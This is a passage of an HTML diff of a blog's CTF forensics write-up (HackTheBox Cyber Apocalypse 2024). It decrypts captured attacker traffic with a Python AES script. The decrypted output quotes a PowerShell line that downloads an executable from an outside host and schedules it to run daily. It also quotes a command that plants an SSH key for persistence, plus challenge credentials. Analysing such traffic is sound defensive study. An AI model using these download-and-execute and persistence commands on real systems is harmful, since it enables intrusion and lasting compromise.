+</span></span><span class="line"><span class="cl">                text = cipherText;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        catch (Exception ex)
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">                Console.WriteLine(ex.Message);
+</span></span><span class="line"><span class="cl">                Console.WriteLine(&#34;Cipher Text: &#34; + cipherText);
+</span></span><span class="line"><span class="cl">                text = &#34;error&#34;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return text;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Side note, translating the array <code>86,101,114,121,95,83,51,99,114,51,116,95,83</code> from decimal yields <code>Very_S3cr3t_S</code>, our interesting string from earlier.</p>
+<p>Returning to the wireshark, there was another TCP string that looked like a lot of encrypted junk. Now that we know how to decrypt, we can revisit:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo1.png"
+	width="1501"
+	height="713"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo1_hu368541403561034974.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo1_hu8474984516266329592.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>To make my life &ldquo;easier&rdquo; with the decrypt function, I asked ChatGPT to generate a python script for me. It only took 2 hours of collaborating before I got something that worked. The barely working script only translates 1 message at a time, so I number the important messages and the translated data:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo2.png"
+	width="1492"
+	height="723"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo2_hu11013799219825753067.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/encryptedconvo2_hu3924115439963018825.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="495px"
+	
+></p>
+<h4 id="decrypted-message-1">Decrypted Message 1:
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="decrypted-message-2">Decrypted Message 2:
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Decrypted Text: cmd;C:\;Username: svc01
+</span></span><span class="line"><span class="cl">Password: Passw0rdCorp5421
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2nd flag part: _h45_b33n_r357
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="decrypted-message-3">Decrypted Message 3:
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="ne">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&#34;https://windowsliveupdater.com/4fva.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;C:\Users\svc01\AppData\Roaming</span><span class="se">\4</span><span class="s2">fva.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">action</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">ScheduledTaskAction</span> <span class="o">-</span><span class="n">Execute</span> <span class="s2">&#34;C:\Users\svc01\AppData\Roaming</span><span class="se">\4</span><span class="s2">fva.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">trigger</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">ScheduledTaskTrigger</span> <span class="o">-</span><span class="n">Daily</span> <span class="o">-</span><span class="n">At</span> <span class="mi">2</span><span class="p">:</span><span class="mi">00</span><span class="n">AM</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">settings</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">ScheduledTaskSettingsSet</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3th flag part:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Register</span><span class="o">-</span><span class="n">ScheduledTask</span> <span class="o">-</span><span class="n">TaskName</span> <span class="s2">&#34;0r3d_1n_7h3_h34dqu4r73r5}&#34;</span> <span class="o">-</span><span class="n">Action</span> <span class="o">$</span><span class="n">action</span> <span class="o">-</span><span class="n">Trigger</span> <span class="o">$</span><span class="n">trigger</span> <span class="o">-</span><span class="n">Settings</span> <span class="o">$</span><span class="n">settings</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note that 3 is just a base64 encoded powershell command, so all that is needed is base64 conversion.
+Finally we can combine the flag:
+<code>HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}</code></p>
+<p>Python decryption script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Protocol.KDF</span> <span class="kn">import</span> <span class="n">PBKDF2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to decrypt data</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">,</span> <span class="n">encrypt_key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;Very_S3cr3t_S&#39;</span>  <span class="c1"># Salt used for key derivation</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv_length</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># IV length</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key_length</span> <span class="o">=</span> <span class="mi">32</span>  <span class="c1"># Key length</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Derive key and IV using PBKDF2</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key_iv</span> <span class="o">=</span> <span class="n">PBKDF2</span><span class="p">(</span><span class="n">encrypt_key</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">dkLen</span><span class="o">=</span><span class="n">key_length</span> <span class="o">+</span> <span class="n">iv_length</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Extract key and IV</span>
+</span></span><span class="line"><span class="cl">        <span class="n">aes_key</span> <span class="o">=</span> <span class="n">key_iv</span><span class="p">[:</span><span class="n">key_length</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv</span> <span class="o">=</span> <span class="n">key_iv</span><span class="p">[</span><span class="n">key_length</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Create AES cipher object</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Decode base64 encoded cipher text</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Decrypt the data</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Unpad the decrypted data (if padding was used)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Convert decrypted data to string using &#39;latin-1&#39; encoding</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">decrypted_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin-1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Cipher Text:&#34;</span><span class="p">,</span> <span class="n">cipher_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;error&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Function to unpad data</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:])]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Read cipher text from file</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher_text_file</span> <span class="o">=</span> <span class="s2">&#34;cipher_text.txt&#34;</span>  <span class="c1"># Change to the path of your ciphertext file</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">cipher_text_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher_text</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encrypt_key</span> <span class="o">=</span> <span class="s2">&#34;VYAemVeO3zUDTL6N62kVA&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">,</span> <span class="n">encrypt_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decrypted Text:&#34;</span><span class="p">,</span> <span class="n">decrypted_text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/misc/">Misc</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/forensics/">Forensics</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/huntress-ctf-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Huntress CTF 2024"
+                        
+                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Huntress CTF 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/picoctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PicoCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hackthebox_cyber_apocalypse_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox_Cyber_Apocalypse_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hack-the-boo-2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hack The Boo 2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nahamconctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NahamConCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
